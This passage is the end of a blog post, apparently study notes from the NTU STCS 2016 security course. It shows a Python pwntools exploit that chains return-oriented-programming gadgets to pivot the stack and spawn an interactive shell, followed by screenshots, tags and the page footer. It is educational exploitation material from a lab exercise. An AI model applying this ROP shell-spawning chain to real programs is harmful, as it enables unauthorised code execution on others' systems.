</span></span><span style="display:flex;"><span>rop11_1 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf5 - 24</span>
</span></span><span style="display:flex;"><span>	pop_rbx_rbp_r12_r13_r14_r15_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop11_2 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf5 + 32</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">68</span>, gets_plt, <span style="color:#75715e"># rop12</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">68</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop12 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf2 + 164</span>
</span></span><span style="display:flex;"><span>	libc_csu_init,
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf7 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop13 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf8, gets_plt, <span style="color:#75715e"># shell command</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf8,
</span></span><span style="display:flex;"><span>	pop_rbx_rbp_r12_r13_r14_r15_ret, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, buf2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	call_at_r12
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop1)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop2)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop4)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop5)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop7)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop9)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop10)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop13)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop3))[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop6_1))[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop6_2)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop8)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop11_1))[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop11_2)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p64, rop12)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="w5-x64-deaslr-process.png" alt="w5-x64-deaslr-process"></p>
<p><img src="w5-getv-from-got.png" alt="w5-getv-from-got"></p>
<p><img src="w5-x64-deaslr-addoffset.png" alt="w5-x64-deaslr-addoffset"></p>
<p><img src="w5-deaslr-base2rbx.png" alt="w5-deaslr-base2rbx"></p>
<ul class="pa0">
  
   <li class="list di">
     <a href="/tags/pwn/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Pwn</a>
   </li>
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
    <p class="f5 b mb3">Related</p>
    <ul class="pa0 list">
	   
	     <li  class="mb2">
          <a href="/posts/ntu-stcs-2016-w4/">NTU STCS 2016学习笔记 0x02 ROP</a>
        </li>
	    
	     <li  class="mb2">
          <a href="/posts/ntu-stcs-2016-w3/">NTU STCS 2016学习笔记 0x01 Intro</a>
        </li>
	    
    </ul>
</div>

</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  Kur0's Blog 2025 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
